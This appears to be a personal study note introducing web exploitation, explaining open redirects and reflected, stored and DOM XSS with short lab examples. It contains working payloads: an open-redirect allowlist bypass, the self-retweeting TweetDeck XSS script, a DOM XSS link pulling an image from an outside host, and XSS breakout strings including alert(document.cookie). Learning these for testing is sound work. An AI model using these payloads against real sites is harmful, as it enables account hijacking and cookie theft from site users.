# Intro to Web Exploitation

## Open redirect

Takes user input to redirect the client from its page to another, usually
controlled by the attacker. Low impact unless used with other vulnerabilities
to escalate. Sometimes the application has security measures to prevent user
from inputting disallowed websites, but bypass is possible; look below.

```
// Allowed
https://example.com/login/?nextPage=https://google.com

// Not allowed
https://example.com/login/?nextPage=https://attackerSite.com

// Allowed
https://example.com/login?nextPage=https://evilsite.com/?google.com
```

## Open redirect lab

This redirects to link after '@'
```
https://google.com@yahoo.com
```

## XSS

Used to execute arbitrary code on client's browser, uses:
1. Phishing
1. Dumping data
1. Account hijack

Attacker injects malicious code onto the website, clients click on link or
visit the website url then the malicious script is executed on their browser.
Executed malicious code is static and predefined. Payload had privilege that
the user has, if admin account then even higher impact.

Impact:
1. XSS medium
1. Stored XSS high-\>critical

* Reflected XSS: Payload injected from user clicking link
* Stored XSS: Payload is stored server side, user visits the link and payload
  is pulled from db
* DOM XSS: Javascript reflected from user source to function

Reflected Example:
```
example.com/page?name=ASH	 ->	Hello, ASH (Normal)
example.com/page?name=<u>ASH</u> ->	Hello, <u>ASH</u> (No XSS)
example.com/page?name=<u>ASH</u> ->	Hello, __ASH__ (Possible XSS)
```

Stored Example:
```HTML
// Tweetdeck
<script
class="xss">$('.xss').parents().eq(1).find('a').
eq(1).click();$('[data-
action=retweet]').click();alert('XSS in
Tweetdeck')</script>
```

DOM Example:
```
https://example.com/#send-transaction<div/class="header__wrap"><a/href
=javascript:alert(0)><h1>pwn3d</h1></a><img/src=//unskid.me/dist/jesus.gif>
</div>
```

## XSS lab

Simple test for XSS:
```
<u>test</u>
<script>alert(document.cookie)</script>
```

More complex example: (If inside tag 'input' for example)
```
"</input><script>alert(1)</script>
```

Another example: Output as a title or somewhere else
```
</title><script>alert()</script>
```

Interesting example: If input is sanitized somewhat
```
// Original code: var name = 'asd';
';+alert(1);//commentOut
```
